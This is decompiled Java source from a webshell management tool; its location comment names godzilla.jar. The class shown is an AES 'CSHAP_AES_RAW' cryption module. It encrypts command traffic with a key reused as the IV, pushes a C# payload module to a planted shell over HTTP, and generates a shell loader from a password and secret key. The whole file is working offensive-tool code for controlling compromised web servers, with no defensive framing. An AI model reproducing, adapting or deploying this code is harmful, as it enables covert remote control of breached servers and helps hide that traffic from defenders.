/*    */ package shells.cryptions.cshapAes;
/*    */ 
/*    */ import core.annotation.CryptionAnnotation;
/*    */ import core.imp.Cryption;
/*    */ import core.shell.ShellEntity;
/*    */ import javax.crypto.Cipher;
/*    */ import javax.crypto.spec.IvParameterSpec;
/*    */ import javax.crypto.spec.SecretKeySpec;
/*    */ import util.Log;
/*    */ import util.functions;
/*    */ import util.http.Http;
/*    */ 
/*    */ @CryptionAnnotation(Name = "CSHAP_AES_RAW", payloadName = "CShapDynamicPayload")
/*    */ public class CShapAesRaw
/*    */   implements Cryption
/*    */ {
/*    */   private ShellEntity shell;
/*    */   private Http http;
/*    */   private Cipher decodeCipher;
/*    */   private Cipher encodeCipher;
/*    */   private String key;
/*    */   private boolean state;
/*    */   private byte[] payload;
/*    */   
/*    */   public void init(ShellEntity context) {
/* 26 */     this.shell = context;
/* 27 */     this.http = this.shell.getHttp();
/* 28 */     this.key = this.shell.getSecretKeyX();
/*    */     try {
/* 30 */       this.encodeCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
/* 31 */       this.decodeCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
/* 32 */       this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(), "AES"), new IvParameterSpec(this.key.getBytes()));
/* 33 */       this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(), "AES"), new IvParameterSpec(this.key.getBytes()));
/* 34 */       this.shell.getHeaders().put("Content-Type", "application/octet-stream");
/* 35 */       this.payload = this.shell.getPayloadModule().getPayload();
/* 36 */       if (this.payload != null) {
/* 37 */         this.http.sendHttpResponse(this.payload);
/* 38 */         this.state = true;
/*    */       } else {
/* 40 */         Log.error("payload Is Null");
/*    */       }
/*    */     
/* 43 */     } catch (Exception e) {
/* 44 */       Log.error(e);
/*    */       return;
/*    */     } 
/*    */   }
/*    */ 
/*    */ 
/*    */   
/*    */   public byte[] encode(byte[] data) {
/*    */     try {
/* 53 */       return this.encodeCipher.doFinal(data);
/* 54 */     } catch (Exception e) {
/* 55 */       Log.error(e);
/* 56 */       return null;
/*    */     } 
/*    */   }
/*    */ 
/*    */ 
/*    */   
/*    */   public byte[] decode(byte[] data) {
/*    */     try {
/* 64 */       return this.decodeCipher.doFinal(data);
/* 65 */     } catch (Exception e) {
/* 66 */       Log.error(e);
/* 67 */       return null;
/*    */     } 
/*    */   }
/*    */ 
/*    */ 
/*    */ 
/*    */   
/*    */   public boolean isSendRLData() {
/* 75 */     return false;
/*    */   }
/*    */ 
/*    */ 
/*    */ 
/*    */   
/*    */   public boolean check() {
/* 82 */     return this.state;
/*    */   }
/*    */ 
/*    */ 
/*    */   
/*    */   public byte[] generate(String password, String secretKey) {
/* 88 */     return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), true);
/*    */   }
/*    */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\cryptions\cshapAes\CShapAesRaw.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */